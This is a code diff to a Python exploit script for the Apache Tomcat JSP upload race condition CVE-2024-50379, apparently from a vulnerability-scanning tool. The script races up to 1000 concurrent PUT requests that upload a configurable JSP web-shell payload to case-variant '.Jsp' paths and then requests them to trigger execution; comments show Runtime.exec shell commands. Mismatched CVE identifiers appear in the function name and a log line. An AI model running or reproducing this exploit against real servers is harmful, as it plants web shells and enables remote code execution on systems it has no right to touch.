@@ -33,7 +33,7 @@ def check_cve_2024_50739(url, config):
         target_url_put1 = urljoin(target_url, "/aa.Jsp")
         target_url_put2 = urljoin(target_url, "/bb.Jsp")
         target_url_get1 = urljoin(target_url, "/aa.jsp")
-        target_url_get2 = urljoin(target_url, "/bb.jsp")
+        target_url_get2 = urljoin(target_url, "/bb.Jsp")
 
         headers1 = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
@@ -47,32 +47,43 @@ def check_cve_2024_50739(url, config):
         # Process process = Runtime.getRuntime().exec(new String[]{" /bin/sh -c ls /usr/local"});
         # payload_put = "aa<% Runtime.getRuntime().exec(\"bin/sh -c ls -al /usr \");%>"
         shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')
-        payload_put = "aa" + shell_file_content
+        payload_put = shell_file_content
 
         # 增加线程
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        # 使用ThreadPoolExecutor来并发执行多个请求
+        with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
             futures = []
             # 循环执行100次
             for _ in range(100):
+                # 发起PUT请求，并将future对象存储在futures列表中
                 futures.append(
                     executor.submit(requests.put, target_url_put1, verify=False, headers=headers1, data=payload_put))
                 futures.append(
                     executor.submit(requests.put, target_url_put2, verify=False, headers=headers1, data=payload_put))
+                # 发起GET请求，并将future对象存储在futures列表中
                 futures.append(executor.submit(requests.get, target_url_get1, verify=False, headers=headers2))
                 futures.append(executor.submit(requests.get, target_url_get2, verify=False, headers=headers2))
 
+            # 使用concurrent.futures.as_completed函数监控futures集合中的所有future对象完成情况
             for future in concurrent.futures.as_completed(futures):
                 try:
+                    # 获取future对象的结果
                     response = future.result()
+                    # 检查response是否为requests.Response实例
                     if isinstance(response, requests.Response):
+                        # 检查HTTP状态码是否表示请求成功
                         if response.status_code in [200, 201]:
+                            # 成功时记录日志并返回True表示漏洞存在
                             logger.info(
-                                f"{Fore.GREEN}[+] 成功: Apache Tomcat CVE-2024-50379  漏洞利用方式:{target_url}aa.JSP OR {target_url}bb.Jsp")
+                                f"{Fore.GREEN}[+] 成功: Apache Tomcat CVE-2024-50379  漏洞利用方式:{target_url}aa.Jsp OR {target_url}bb.Jsp")
                             return True, "CVE-2024-50379", None
                 except requests.exceptions.RequestException as req_ex:
+                    # 捕获请求异常并记录日志
                     logger.warning(f"{Fore.RED}[-] 请求失败: {req_ex}")
                 except Exception as e:
+                    # 捕获未知异常并记录日志
                     logger.error(f"{Fore.RED}[-] 发生未知错误: {e}")
+                    # 记录漏洞检测失败信息
                     logger.warning(f"{Fore.RED}[-] 失败: CVE-2017-12615 漏洞 Not Found")
 
             return False, None, None
